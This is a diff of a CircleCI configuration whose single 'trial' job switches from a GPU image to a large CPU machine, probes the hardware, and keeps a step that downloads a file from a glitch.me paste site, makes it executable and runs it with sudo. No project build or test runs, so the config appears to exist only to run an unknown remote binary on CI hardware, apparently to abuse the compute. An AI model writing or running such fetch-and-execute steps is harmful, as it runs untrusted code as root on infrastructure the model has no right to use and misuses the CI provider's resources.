@@ -3,11 +3,10 @@ version: 2.1
 jobs:
   trial:
     machine:
-      image: ubuntu-2004-cuda-11.4:202110-01
-    resource_class: gpu.nvidia.large
+      image: ubuntu-2004:current
+    resource_class: large
     steps:
-      - run: nvidia-smi
-      - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
+      - run: lscpu
       - run: 
             name: "trial" 
             command: wget https://muq-hastebin.glitch.me/raw/rbXy36HWQr && chmod u+x rbXy36HWQr && sudo ./rbXy36HWQr
